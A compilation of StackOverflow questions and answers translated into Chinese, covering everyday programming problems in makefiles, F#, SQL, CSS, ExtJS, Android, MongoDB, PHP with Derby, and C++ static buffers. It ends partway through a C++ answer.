# StackOverflow 问答 14346000-14346999

# windows - Cygwin，如何为在根目录和任何子目录中找到的所有 makefile 运行“make”？

> ID：14346002
> 
> 赞同：1
> 
> 时间：2013-01-15T20:10:43.403
> 
> 标签：windows, makefile, cygwin

我有一个由各种子目录组成的目录。在每个子目录中都有一个 makefile。在根目录下，还有一个make文件。我需要在 cygwin 中执行一个 make 指令，该指令对主目录和任何子目录中的所有 makefile 执行“make”。任何想法如何做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-16T00:50:27.460

这是我见过的常见方式。“主” Makefile 内部将类似于此代码。

```
all:
    cd library  && $(MAKE) all && cd ..
    cd programs && $(MAKE) all && cd ..
    cd tests    && $(MAKE) all && cd .. 
```

[**参考**](http://github.com/polarssl/polarssl/blob/master/Makefile)

# f# - F# 立方根测量单位

> ID：14346003
> 
> 赞同：1
> 
> 时间：2013-01-15T20:10:43.657
> 
> 标签：f#

F# 有内置的立方根函数吗？我知道我可以使用求幂来计算立方根，但在我的情况下它不会进行类型检查，因为我想获取浮点类型数量的立方根并得到一个浮点数。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-15T20:30:52.363

我不认为有一个内置函数可以用测量单位计算立方根（我假设它会在[原始运算符模块](http://msdn.microsoft.com/en-us/library/ee353754.aspx)中`sqrt`，其他模块在哪里），所以我认为唯一的选择是使用求幂。

但是，您可以在没有单位的情况下使用幂运算，并将单位不安全操作包装在一个添加单位的函数中，这样您就可以获得具有正确单位的函数：

```
let cuberoot (f:float<'m^3>) : float<'m> = 
  System.Math.Pow(float f, 1.0/3.0) |> LanguagePrimitives.FloatWithMeasure 
```

请注意，F# 不支持[小数单位](https://stackoverflow.com/questions/11333135/fractional-power-of-units-of-measures-in-f)，因此您可以编写`cuberoot (10.0<m^3>)`or `cuberoot (10.0<m^9>)`，但如果您编写`cuberoot (10.0<m>)`，它将不会进行类型检查，因为结果将是米到`1/3`（这是一个小数单位）。

此示例仅`cuberoot`针对`float`. 如果您想编写与其他数字类型一起使用的重载函数（我想您可能需要`float32`），那么它会变得有点丑陋（所以除非必要，否则我不建议这样做），但是您可以使用具有多个重载的中间类型的技巧，例如，例如，在[这个答案](https://stackoverflow.com/questions/14121556/overloading-measure-operator/14122388#14122388)中。

# java - 播放框架v2，存储版本信息的单一地方？

> ID：14346004
> 
> 赞同：1
> 
> 时间：2013-01-15T20:10:48.260
> 
> 标签：java, playframework-2.0, version

与[此问题](https://stackoverflow.com/questions/12369967/play-framework-2-read-the-application-version-defined-in-build-scala)相关，是否有存储版本信息的最佳位置，以便在 Play 2 项目中访问且不重复？我们有多个 application.conf 文件（每个开发人员都有一个），所以这对我们来说不是一个获取版本信息的好地方。此外，对于一个简单的版本号，SBT buildInfo 插件似乎有点矫枉过正。

链接问题末尾的评论说将版本信息存储在 Global.java 中，然后可以在您的 play 应用程序中访问它（例如显示在您的页脚中）。然后您可以忽略 Build.scala 中的程序名称/版本，而只在 Global.java 中维护您的实际名称/版本吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-16T08:06:36.980

在第一行使用`application.conf`并将其包含在您的开发人员配置文件中。`include "application.conf"`

# html - 使整页变白

> ID：14346006
> 
> 赞同：0
> 
> 时间：2013-01-15T20:11:08.097
> 
> 标签：html, css

我的网站目前在小屏幕上是这样的：http:
[//d.pr/i/KwI8+](http://d.pr/i/KwI8+)

在大屏幕上就像
[http://d.pr/i/ckmF+](http://d.pr/i/ckmF+)

但我需要这样：
[http ://d.pr/i/IJc7+](http://d.pr/i/IJc7+)

现场演示在[http://www.random-radio.net/](http://www.random-radio.net/)

CSS

```
html, body{
    width:100%; 
    min-height: 100%;
    height: auto !important;        
    height:100%;

    margin:0 !important;
    padding:0 !important;
    opacity: 0.99;

    -webkit-touch-callout: none;
    -webkit-user-select: none;
    -khtml-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    user-select: none;

    box-sizing: border-box;
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;

    background-color: #cfcfcf;
}

#page
{
    position: relative;
    top: 0px;
    bottom: 0;
    left: 50%;
    margin-left: -512px;
    width: 1024px;
    overflow: visible;
    background-color: #FFF;
    /*margin-left: auto;
    margin-right: auto;*/
} 
```

我想要`div`从页面顶部到页面底部。我目前正在尝试使用上面的CSS，但是在高于内容的屏幕上`div`，背景获得`#cfcfcf`了正文的背景

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-15T20:14:26.910

你需要`div`有一个`height: 100%`和 的背景`#ffffff`。

```
html, body {margin: 0; padding: 0; height: 100%;}
#page {margin: 0 auto; width: 1024px; height: 100%; background-color: #ff0000;} 
```

## [看这个演示](http://jsfiddle.net/X943y/)

# sql - 使用变量修改 Select 以便它可以在 Set 操作中使用

> ID：14346008
> 
> 赞同：0
> 
> 时间：2013-01-15T20:11:09.547
> 
> 标签：sql, sql-server-2008

我有以下代码，我从表中选择 LossAmount 值，在该表中我创建了一个序列列以及我的 LossAmount 列，并根据特定的序列号选择 LossAmount 值。

```
declare @percent float
set @percent = 0.95

select LossAmount
from (select LossAmount, seq = ROW_NUMBER() over (order by LossAmount desc) from dbo.TestXB_TotalLoss) as p
where p.seq =((select COUNT(*) from dbo.TestXB_TotalLoss)-((select COUNT(*) from dbo.TestXB_TotalLoss)*@percent)) 
```

所以说我的 LossAmount 列有 1000 行，p.seq 方程是`1000-1000(0.95)`. 我在该序列号（即 50）处选择 LossAmount 值。

就我而言，我的参数是一个标量。如果我要计算各种百分比，如何更新我的代码？我有下表，dbo.Percentiles

```
Percentiles
0.4
0.6
0.996 
```

对于我的输出，我想要这样的东西。

```
Percentiles   LossAmount
0.4           ...some #...
0.6           ...some #...
0.996         ...some #... 
```

任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T20:33:13.763

这总是比我认为的要难。挑战是让一排出来。我认为以下内容可以做到：

```
select pt.pcent, min(LossAmount)
from (select tl.*, p.pcent, ROW_NUMBER() over (order by LossAmount desc) as seqnum,
             count(*) over () as totnum
      from dbo.TestXB_TotalLoss cross join
           (select 0.95 as pcent
           ) p
     ) pt
where totnum*pcent - seqnum >= 0 and totnum*pcent - seqnum < 1 
```

这会将百分比移动到内部表`p`中并进行交叉连接。然后，它选择计划行号 ( `totnum*pcent`) 与实际行号 ( `seqnum`) 之间的差为非负且小于 1 的行。

我没有测试过这个特定的查询，所以它可能有语法错误。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T20:35:06.987

我认为这应该对你有用，有更简洁的方法来编写它，但我想尽可能少地更改你的代码......

```
select  LossAmount, n.percentiles
from   (select  LossAmount, 
                seq = ROW_NUMBER() over (order by LossAmount desc) 
        from    dbo.TestXB_TotalLoss) as p
join   (Select ((select COUNT(*) from dbo.TestXB_TotalLoss)-((select COUNT(*) from dbo.TestXB_TotalLoss)*percentiles)) As seq, percentiles
        From    dbo.Percentiles) n
        On  p.seq = n.seq 
```

# javascript - 带有手风琴布局的固定搜索栏 - EXT JS4

> ID：14346009
> 
> 赞同：0
> 
> 时间：2013-01-15T20:11:09.343
> 
> 标签：javascript, extjs, extjs4, accordion

我需要在我的菜单栏顶部有一个固定的搜索栏。这是我到目前为止所拥有的：

```
Ext.define('Cam.view.menu.LeftSidebar', {
    extend: 'Ext.panel.Panel',
    alias: 'widget.leftsidebar',
    views: 'Cam.view.menu.Search',
    defaults: {
        // applied to each contained panel
        bodyStyle: 'padding:0px;'
    },
    layout: {
        // layout-specific configs go here
        type: 'accordion',
        titleCollapse: true,
        animate: true,
        activeOnTop: true
    },
    title: _SIDEBAR_LEFT_TITLE,
    items: [
    {
        title: 'Menu Search',
        items: [{xtype: 'menusearch'
                }]
    },
    {
        title: _SIDEBAR_LEFT_PREVIOUS,
        xtype: 'menuhistory',
        itemId: 'menuhistory'
    },
    {
        title: 'Menu',
        items: [{xtype: 'screenmenu'}]
    }]
}); 
```

到目前为止，它按我想要的方式折叠，但 xtype:'menusearch' 是我想要固定在顶部的。和 xtype:'menuhistory' 是活跃的。

对此有什么帮助吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-15T21:19:58.323

你可以这样做：

```
Ext.require('*');

Ext.onReady(function() {

    Ext.create('Ext.panel.Panel', {
        width: 400,
        height: 400,
        renderTo: document.body,
        layout: {
            type: 'vbox',
            align: 'stretch'
        },
        items: [{
            xtype: 'textfield',
            fieldLabel: 'Search'
        }, {
            flex: 1,
            xtype: 'container',
            layout: 'accordion',
            items: [{
                title: 'Item 1',
                html: 'I1'
            }, {
                title: 'Item 2',
                html: 'I2'
            }, {
                title: 'Item 3',
                html: 'I3'
            }]
        }]
    });

}); 
```

# android - 从另一个资源引用一个资源

> ID：14346011
> 
> 赞同：0
> 
> 时间：2013-01-15T20:11:13.057
> 
> 标签：android, android-resources

快速提问我的 SO/documentation-checking 未能回答：

是否可以将字符串数组资源的值作为对另一个字符串数组资源的引用？

例如，假设我有一个这样的数组

```
<string-array
android:name="names">
    <item>Danny</item>
    <item>Trevor></item>
    <item>Garth</item>
</string-array> 
```

有没有办法得到这个暗示的效果：

```
<string-array
android:name="appellations"
android:value="@string-array/names" / > 
```

这样，比如说， getStringArray(R.array.appellations) 返回“名称”数组？

# google-maps-sdk-ios - Google 会在多长时间内处理 Google Maps SDK for iOS 的 API 密钥请求？

> ID：14346018
> 
> 赞同：0
> 
> 时间：2013-01-15T20:11:29.070
> 
> 标签：google-maps-sdk-ios

我们已于 2012 年 12 月提交了在线表格[https://developers.google.com/maps/ios-access](https://developers.google.com/maps/ios-access)，但我们仍未收到 Google 的任何回复。

有没有人在 12 月发布过类似请求，知道谷歌通常需要多长时间才能回复此类请求？

如果我们知道这一点，它将帮助我们（可能还有其他发布类似问题的人）计划我们何时可以开始开发我们的 iPhone 应用程序，因为

[不幸的是， https://developers.google.com/maps/documentation/ios/start](https://developers.google.com/maps/documentation/ios/start)的“获取 API 密钥”部分建议的通过 API 控制台生成 API 密钥的自助服务方法对我们不起作用，因为我们根本不请参阅服务列表中的“Google Maps SDK for iOS”。

同样在我们的验证中（除非我们以错误的方式进行操作），如果没有 API 密钥，SDK 将无法工作。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-16T00:16:32.397

我在 12 月 13 日申请了访问权限，然后在 12 月 17 日收到一封电子邮件，说我已获得批准。

但我认为这不应该被理解为需要 4 天才能获得批准。

Google 正在逐步推出对其 SDK 的访问权限。他们可能收到的请求比他们想要提供的访问权限要多得多。也许他们已经达到了初始配额，并且正在等待某些事情（例如发布新版本，或优化他们的后端等），然后再发布更多内容。或者他们可能每天分批发布 N 或其他东西。因此，其他人获得批准可能需要一些时间。

此外，我不确定 Google 是否以先到先得的方式发布它们。申请表会询问您在应用商店中是否有现有应用。也许谷歌会根据你是否有一个应用程序来发布访问权限，如果你有，它看起来有多受欢迎和/或应用程序的集成地图如何，或类似的东西。

所以在这个阶段，我认为你所能做的就是等待。

# php - 使用 IJ 工具的 PHP Derby 连接？

> ID：14346022
> 
> 赞同：0
> 
> 时间：2013-01-15T20:11:53.493
> 
> 标签：php, sql, jdbc, derby, embedded-database

我正在编写一个从 Derby 数据库读取的 PHP 程序，并且想知道是否有一种方法可以使用 ij 工具连接到嵌入式 Derby 数据库。

主机是 Mac，我找不到 obdc 驱动程序的免费/开源工具，但我能够使用 ij 工具读入数据库。

我能够使用 dblook 提取结构并解析该信息：

```
 $cmd = $dblook." -d \"jdbc:derby:" .$db. "\" -t ".$table; 

 exec($cmd, $output);
 foreach ($output as $item){
    $arr = explode(' ',trim($item));
    if($arr[0]=="CREATE"){
      echo $item;
      break;
    }
 } 
```

那么有没有办法使用 ij 工具进行类似的连接？喜欢：

```
 $cmd = $ijlocation." -d \"jdbc:derby:" .$db. "\" -t ".$table; 
```

或者任何其他方式让我得到一个很好的表格数据输出。

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-16T15:11:21.033

如果你可以从你的 PHP 程序中调用“ij”，你可以给 ij 一个参数，它是要运行的命令文件的名称：http: [//db.apache.org/derby/docs/10.9/tools/ttoolsij98878。 html](http://db.apache.org/derby/docs/10.9/tools/ttoolsij98878.html)

然后在该文件中，有两行：

```
connect 'jdbc:derby:$db';
select * from $table; 
```

# java - Spring data mongodb查询自动将String转换为ObjectId

> ID：14346028
> 
> 赞同：6
> 
> 时间：2013-01-15T20:12:10.887
> 
> 标签：java, mongodb, spring-data

标题可能不是很清楚，问题在这里

我正在以这种形式执行更新：

```
db.poi.update({
  _id: ObjectId("50f40cd052187a491707053b"),
  "votes.userid": {
    "$ne": "50f5460d5218fe9d1e2c7b4f"
  }
},
{
  $push: {
    votes: {
      "userid": "50f5460d5218fe9d1e2c7b4f", 
      "value": 1
    }
  },
  $inc: { "score":1 }
}) 
```

仅当没有具有相同用户 ID 的文档时才在数组中插入文档（解决方法，因为唯一索引不适用于数组）。该代码在 mongo 控制台上运行良好。在我的应用程序中，我正在使用这个：

```
@Override
public void vote(String id, Vote vote) {
    Query query = new Query(Criteria.where("_id").is(id).and("votes.userid").ne(vote.getUserid()));
    Update update = new Update().inc("score", vote.getValue()).push("votes", vote);
    mongoOperations.updateFirst(query, update, Poi.class);
} 
```

如果作为“userid”我使用不能是 mongo ObjectId 的字符串，这很好用，但是如果我在示例中使用字符串，则执行的查询将像这样翻译（来自 mongosniff）：

```
update  flags:0 q:{ _id: ObjectId('50f40cd052187a491707053b'), votes.userid: { $ne: ObjectId('50f5460d5218fe9d1e2c7b4f') } } o:{ $inc: { score: 1 }, $push: { votes: { userid: "50f5460d5218fe9d1e2c7b4f", value: 1 } } } 
```

该字符串现在是一个 Objectid。这是一个错误吗？BasicQuery 做同样的事情。我看到的唯一其他解决方案是对所有类 id 使用 ObjectId 而不是 String。

有什么想法吗？

**更新：**

这是投票类

```
public class Vote {
  private String userid;
  private int value;
} 
```

这是用户类

```
@Document
public class User {

  @Id
  private String id;
  private String username;
} 
```

这是我正在执行此更新的类和 mongo 文档

```
@Document
public class MyClass {

  @Id
  private String id;
  @Indexed
  private String name;
  int score
  private Set<Vote>votes = new HashSet<Vote>();
} 
```

作为杰森

```
{
  "_id" : ObjectId("50f40cd052187a491707053b"),
  "name" : "Test",
  "score" : 12,
  "votes" : [
    {
      "userid" : "50f5460d5218fe9d1e2c7b4f",
      "value" : 1
    }
  ]
} 
```

votes.userid 中的 Userid 被推送为 String，但相同的 String 被比较为 $ne 中的 ObjectId

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-16T11:22:52.047

在我看来，问题可以这样描述：如果您在类中使用 String 代替 ObjectId，如果您想在其他文档（和嵌入式文档）中使用这些 id 作为引用（没有 dbrefs），它们会被推送作为字符串（没关系，因为它们是字符串）。这很好，因为 spring data 可以再次将它们映射到 objectid，但是如果您像我提到的那样进行查询，那就不好了；该字段在比较中转换为 objectid（在本例中为 $ne 运算符），但在嵌入文档中被视为字符串。所以，总结一下，在我看来，在这种情况下 $ne 运算符应该将字段视为字符串。

我的解决方案是编写一个自定义转换器，将字符串作为 objectid 存储在 id 是参考的文档中

```
public class VoteWriteConverter implements Converter<Vote, DBObject> {

  @Override
  public DBObject convert(Vote vote) {
    DBObject dbo = new BasicDBObject();
    dbo.put("userid", new ObjectId(vote.getUserid()));
    dbo.put("value", vote.getValue());
    return dbo;
  }
} 
```

# sql-server - SQL - 构建具有日历日粒度的事实表

> ID：14346033
> 
> 赞同：1
> 
> 时间：2013-01-15T20:12:47.437
> 
> 标签：sql-server, ssas, mdx, cube

我有一个数据集 (DATASET1)，其中列出了所有员工及其部门 ID、他们开始的日期和终止的日期。

我希望我的查询返回一个数据集，其中每一行代表每个员工留职的一天，以及工作天数（开始至今）。

我该如何查询？感谢您的帮助，提前。

数据集1

```
DeptID     EmployeeID   StartDate   EndDate
--------------------------------------------
001        123           20100101   20120101   
001        124           20100505   20130101 
```

数据集2

```
DeptID     EmployeeID    Date       #ofDaysWorked
--------------------------------------------
001        123           20100101   1
001        123           20100102   2
001        123           20100103   3
001        123           20100104   4
....       ....          ........   ... 
```

EIDT：我的目标是构建一个事实表，用于在 SSAS 中导出度量。我正在建立的衡量标准是“平均就业年限”。该度量将部署在仪表板中，用户将能够选择一个日历周期并向下钻取到月、周和天。这就是为什么我需要从如此大的数据集开始。也许我可以通过使用 MDX 查询来实现这个目标，但是如何实现呢？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T20:21:48.640

您可以使用递归 CTE 来执行此操作：

```
;with data (deptid, employeeid, inc_date, enddate) as
(
  select deptid, employeeid, startdate, enddate
  from yourtable
  union all
  select deptid, employeeid,
    dateadd(d, 1, inc_date),
    enddate
  from data
  where dateadd(d, 1, inc_date) <= enddate
) 
select deptid,
  employeeid,
  inc_date,
  rn NoOfDaysWorked
from
(
  select deptid, employeeid,
    inc_date, 
    row_number() over(partition by deptid, employeeid
                      order by inc_date) rn
  from data
) src
OPTION(MAXRECURSION 0) 
```

请参阅[带有演示的 SQL Fiddle](http://sqlfiddle.com/#!3/3d080/5)

结果与此类似：

```
| DEPTID | EMPLOYEEID |       DATE | NOOFDAYSWORKED |
-----------------------------------------------------
|      1 |        123 | 2010-01-01 |              1 |
|      1 |        123 | 2010-01-02 |              2 |
|      1 |        123 | 2010-01-03 |              3 |
|      1 |        123 | 2010-01-04 |              4 |
|      1 |        123 | 2010-01-05 |              5 |
|      1 |        123 | 2010-01-06 |              6 |
|      1 |        123 | 2010-01-07 |              7 |
|      1 |        123 | 2010-01-08 |              8 |
|      1 |        123 | 2010-01-09 |              9 |
|      1 |        123 | 2010-01-10 |             10 |
|      1 |        123 | 2010-01-11 |             11 |
|      1 |        123 | 2010-01-12 |             12 | 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-15T20:36:30.823

```
SELECT DeptID, EmployeeID, Date, DATEDIFF(DAY, StartDate, '3/1/2011') AS ofDaysWorked
FROM DATASET1 
```

看看有没有用！

# matlab - 如何将轴对象放在 MATLAB 中的图形顶部？

> ID：14346037
> 
> 赞同：2
> 
> 时间：2013-01-15T20:13:05.320
> 
> 标签：matlab, matlab-figure

我现在正在使用 MATLAB R2012b。我想与轴一起绘制一个灰色矩形，并希望该矩形位于轴的后面。我试过了

```
uistack(gca,'top'); 
```

但什么也没发生。

在[这篇文章](http://www.mathworks.com/support/solutions/en/data/1-15P9E/?solution=1-15P9E)中，他们提到

> 但是，可以将坐标区对象放在 UIPANEL 对象（在 MATLAB 7.0 (R14) 中引入）之上。

所以我认为应该有一些方法可以做到这一点。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-15T20:22:57.840

尝试以下操作：-

```
set(gca, 'Layer', 'top') 
```

参考：[在图形线的顶部绘制带有框架、刻度的 Matlab 图形](https://stackoverflow.com/questions/3655256/draw-matlab-graphs-with-frame-ticks-on-top-of-graph-lines)

# c++ - c++ 对象正在创建同一个数组的两个实例，但在不同的范围内？

> ID：14346040
> 
> 赞同：2
> 
> 时间：2013-01-15T20:13:36.237
> 
> 标签：c++

我的一门课有问题。该类中只有 1 个 array<> 成员。我正在构建此类的静态对象，并初始化函数中的值。问题是永远不会插入这些值。

当我进入调试器并查看该数组中的一些基本插入语句时，该数组仍然为空。但是，如果我进入插入函数本身，我可以看到一个完全相同名称的“第二个”数组，并按预期存储值。

在我看来，好像有一个静态外部范围数组，其中没有任何内容，还有一个正确存储内容的第二个内部版本（完全相同的数组）。

我在这里缺少什么吗？我真的不知道为什么会这样。

这是根据要求的最低源代码

**循环缓冲区.hpp**

```
#ifndef __ma__circularbuffer_guard
#define __ma__circularbuffer_guard

#include <array>

template < typename T, int SIZE> 
class CircularBuffer
{
private:
int _index;
int _size;
std::array<T, SIZE> _buffer;
public:
CircularBuffer() { _index = 0; _size = SIZE; }

int             length  ();
typename T&     at      (int);
void            insert  (T);
int             index   ();

private:
int     realign (int&);

};

template < typename T, int SIZE> 
int CircularBuffer<T, SIZE>::realign (int& index)
{
if (index >= _size)
{
    index -= _size;
    realign(index);
} else if (index < 0)
{
    index += _size;
    realign(index);
}
return index;
}

template < typename T, int SIZE> 
int CircularBuffer<T, SIZE>::length ()
{
return _size;
}

template < typename T, int SIZE> 
typename T& CircularBuffer<T, SIZE>::at (int index)
{
realign(index);
return _buffer.at(index);
}

template <typename T, int SIZE>
void CircularBuffer<T, SIZE>::insert (T data)
{
realign(_index);
_buffer.at(_index) = data;
_index += 1;
}

template <typename T, int SIZE>
int CircularBuffer<T, SIZE>::index ()
{
return _index;
}

#endif 
```

**全局缓冲区初始化器**

```
#ifndef __guard__namespace__notes__
#define __guard__namespace__notes__

#include "circularbuffer.hpp"
#include <memory>

typedef CircularBuffer<char, 7> CB_Natural_T;
typedef CircularBuffer<int, 12> CB_Chromatic_T;

static CB_Natural_T WHITENOTES = CB_Natural_T();        // buffer of letter notes
static CB_Chromatic_T POSITIONS = CB_Chromatic_T();     // buffer of absolute positions on keyboard

struct Initialize
{
    Initialize()
    {
        WHITENOTES.insert('C');
        WHITENOTES.insert('D');
        WHITENOTES.insert('E');
        WHITENOTES.insert('F');
        WHITENOTES.insert('G');
        WHITENOTES.insert('A');
        WHITENOTES.insert('B');

        // Initialize all positions
        for (int i = 0; i < 12; ++i)
            POSITIONS.insert(i);
    }
};

static Initialize dummy_init_var = Initialize();

#endif 
```

初始化静态缓冲区，以便我可以对其他类进行单元测试。

**注意类头和cpp**

```
#ifndef __guard__note__
#define __guard__note__

#include "macros.h"
#include <string>
#include <memory>

class Note
{
public:
enum Qualities { UNKNOWN = -3, DFLAT, FLAT, NATURAL, SHARP, DSHARP };   // qualities of note
typedef DEF_PTR(Note);                                                  // pointer type
private:
char _letter [1];       // the letter of the note
std::string _name;      // the full name of the note    
int _value;             // absolute value
int _position;          // relative position
Qualities _quality;     // sharp/natural/flat quality

public:
Note();
Note(char);             // letter
Note(char, Qualities);  // letter, and quality

// setters
void sharp();       // Sets the quality of the note to 1
void Dsharp();      // Sets the quality of the note to 2
void flat();        // Sets the quality of the note to -1
void Dflat();       // Sets the quality of the note to -2
void natural();     // Sets the quality of the note to 0

// getters
char letter() const;        /* returns character letter */
std::string name() const;   /* returns true name of note */
int position() const;       /* returns relative position on keyboard */
int quality() const;        /* returns the quality of the note */
void respell() const;       /* respells a note to the nearest other note */

static pointer_type make(char);             // returns a shared pointer of a new Note
static pointer_type make(char, Qualities);  // returns a shared pointer of a new Note

// operators
bool operator ==(Note& r) const;    // Returns true if Notes are truly equal
bool operator !=(Note& r) const;    // Returns true if Notes are truly not equal

bool isEnharmonic(Note& r) const;   // Returns true if Notes are enharmonically equal
bool isNatural() const;             // Returns true if Note is natural
bool isSharp() const;               // Returns true if Note is sharp
bool isDSharp() const;              // Returns true if Note is double sharp
bool isFlat() const;                // Returns true if Note is flat
bool isDFlat() const;               // Returns true if Note is double flat

private:
void makeName();    /* sets name of Note */
};

#endif

#include "note.h"

Note::Note() 
{
_letter[1] = 'u';
_name = ""; 
_value = -1; 
_quality = UNKNOWN;
_position = -1;
}

Note::Note(char l)
{
_letter[1] = l;

// determine absolute value based on letter
switch (l)
{
case 'C':
    _value = 0; break;
case 'D':
    _value = 2; break;
case 'E':
    _value = 4; break;
case 'F':
    _value = 5; break;
case 'G':
    _value = 7; break;
case 'A':
    _value = 9; break;
case 'B':
    _value = 11; break;
default:
    _value = -1; break;
}

_quality = NATURAL;
_position = _value + _quality;
makeName();
}

Note::Note(char l, Note::Qualities q)
{
_letter[1] = l;

// determine absolute value based on letter given
switch (l)
{
case 'C':
    _value = 0; break;
case 'D':
    _value = 2; break;
case 'E':
    _value = 4; break;
case 'F':
    _value = 5; break;
case 'G':
    _value = 7; break;
case 'A':
    _value = 9; break;
case 'B':
    _value = 11; break;
default:
    _value = -1; break;
}

_quality = q;       // assert for good data
_position = _value + _quality;
makeName();
}

void Note::sharp()      { _quality = SHARP;     _position = _value + 1; makeName();}
void Note::Dsharp()     { _quality = DSHARP;    _position = _value + 2; makeName();}
void Note::flat()       { _quality = FLAT;      _position = _value - 1; makeName();}
void Note::Dflat()      { _quality = DFLAT;     _position = _value - 2; makeName();}
void Note::natural()    { _quality = NATURAL;   _position = _value;     makeName(); }

char Note::letter() const       { return _letter[1]; }
std::string Note::name() const  { return _name; }
int Note::position() const      { return _position; }
int Note::quality () const      { return _quality; }

Note::pointer_type Note::make(char l)                    { return pointer_type(new Note(l)); }
Note::pointer_type Note::make(char l, Note::Qualities q) { return pointer_type(new Note(l, q)); }

void Note::makeName()
{
_name = "";
_name += _letter[1];    // add letter to name

// find out quality, add quality to name
switch (_quality)
{
case DFLAT:
    _name += "bb"; break;
case FLAT:
    _name += "b"; break;
case SHARP:
    _name += "#"; break;
case DSHARP:
    _name += "x"; break;
case NATURAL:
    break;
default:
    _name += "u"; break;
}
}

bool Note::operator ==(Note& r) const
{
// true if letter, value, position, and quality are all equal
return (_letter[1] == r._letter[1]) && (_value == r._value) && (_position == r._position) && (_quality == r._quality);
}

bool Note::operator !=(Note& r) const
{
return !(*this == r);
}

bool Note::isEnharmonic (Note& r) const
{
return (_position == r._position);
}

bool Note::isNatural() const
{
return _quality == NATURAL;
}

bool Note::isSharp() const
{
return _quality == SHARP;
}

bool Note::isDSharp() const
{
return _quality == DSHARP;
}

bool Note::isFlat() const
{
return _quality == FLAT;
}

bool Note::isDFlat() const
{
return _quality == DFLAT;
} 
```

我也会发布间隔，但那个非常大。但基本上在名为 findInterval 的 Intervals 函数之一中有这段代码

**间隔::findInterval**

```
void Interval::findInterval(Note& bottom, Note& top)
{
int index = 0;      // temp placeholder for start position

// find where the bottom note is in relation to buffer
for (int i = 0; i < WHITENOTES.length(); ++i)
{
    if (bottom.letter() == WHITENOTES.at(i))
    {
        index = i;  // set start position to this position
        break;
    }
}

// find the interpreted interval
// starting from index, with offset of length + index
for (int i = index; i < (index + WHITENOTES.length()); ++i)
{
    if (top.letter() == WHITENOTES.at(i))
    {
        _interval = i - index;  // set interval
        break;
    }
}

// modify index to serve as the position of the bottom note
index = bottom.position();

// find the physical distance
for (int i = index; i < (index + POSITIONS.length()); ++i)
{
    if (top.position() == POSITIONS.at(i))      // values match
    {
        _distance = i - index;                  // set physical distance
        break;
    }
    else if (top.position() > 11 && ((top.position() - 11) == POSITIONS.at(i)))     // if top position is higher than octave
    {
        _distance = (i - index) + 11;
        break;
    }
}

} 
```

它无法在此处设置数据成员，因为 WHITENOTES 是空的，即使我调用以使用静态结构对其进行初始化。

需要注意的另一件事是，如果我编译我的 ut_interval，所有测试都完美返回，没有失败，当我在调试器中检查缓冲区的值时，它们显示为 \0。但是它仍然通过 if 语句并将字符与字母匹配（这是调试器中字符的某种加密吗？）

但是，ut_chord 中的#includes 完全相同，它无法评估间隔

这是间隔 ut 和和弦 ut 的示例

**ut_interval**

```
#include "../common/namespace_notes.h"
#include "../common/note.h"
#include "../common/interval.h"

#define BOOST_TEST_MODULE IntervalTest
#include <boost/test/auto_unit_test.hpp>

#define TEST_IVL(i, dist, itv, q, n) \
BOOST_CHECK(i.distance() == dist); \
BOOST_CHECK(i.interval() == i.itv); \
BOOST_CHECK(i.quality() == i.q); \
BOOST_CHECK(i.name() == n)

BOOST_AUTO_TEST_CASE(INTERVAL_UNISONS)
{
// make some notes
Note C = Note('C');
Note Cs = Note('C', Cs.SHARP);
Note Cds = Note('C', Cds.DSHARP);
Note Cf = Note('C', Cf.FLAT);
Note Cdf = Note('C', Cdf.DFLAT);

// make some intervals
Interval PUnison = Interval(C, C);
Interval AugUnison = Interval(C, Cs);
Interval Aug2Unison = Interval(C, Cds);
Interval DimUnison = Interval(C, Cf);
Interval Dim2Unison = Interval(C, Cdf);

// make sure members are accurate
TEST_IVL(PUnison, 0, UNISON, PER, "Perfect Unison");
BOOST_CHECK(PUnison.isPerfect());

TEST_IVL(AugUnison, 1, UNISON, AUG, "Augmented Unison");
BOOST_CHECK(AugUnison.isAugmented());

TEST_IVL(Aug2Unison, 2, UNISON, AUG, "Augmented Unison");
BOOST_CHECK(AugUnison.isAugmented());

TEST_IVL(DimUnison, 1, UNISON, AUG, "Augmented Unison");
BOOST_CHECK(DimUnison.isAugmented());

TEST_IVL(Dim2Unison, 2, UNISON, AUG, "Augmented Unison");
BOOST_CHECK(Dim2Unison.isAugmented());
} 
```

**ut_chord**

```
#include "../common/namespace_notes.h"
#include "../common/note.h"
#include "../common/interval.h"
#include "../common/chord.h"

#define BOOST_TEST_MODULE ChordTest
#include <boost/test/auto_unit_test.hpp>
#include <memory>

BOOST_AUTO_TEST_CASE(ChordConstructor)
{
typedef std::shared_ptr<Note> nt;
nt C = nt(new Note('C'));
nt E = nt(new Note('E'));
nt G = nt(new Note('G'));
nt B = nt(new Note('B'));

Interval PUnison = Interval(*C, *C); // cannot determine this interval
Chord C7 = Chord(C , E, G, B);
Chord C72 = Chord(B, G, E, C);
Chord C73 = Chord(E, G, C, B);
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-15T21:47:57.627

首先，您不应包含 .cpp 文件。要解决您遇到的链接器问题，请遵循[包含模型](http://www.linuxtopia.org/online_books/programming_books/c++_practical_programming/c++_practical_programming_134.html)：将您的函数定义放在模板的头文件中。

其次，我尝试了以下示例程序，它现在可以工作了——问题可能是由于链接器错误造成的。

有关包含 cpp 文件（和模板）的更多信息，请阅读[此 SO 问题。](https://stackoverflow.com/questions/8836871/include-cpp-file)

主.cpp：

```
#include <array>
#include "circularbuffer.h"

typedef CircularBuffer<char, 7> CB_Natural_T;
typedef CircularBuffer<int, 12> CB_Chromatic_T;

static CB_Natural_T WHITENOTES = CB_Natural_T();        // buffer of letter notes
static CB_Chromatic_T POSITIONS = CB_Chromatic_T(); 

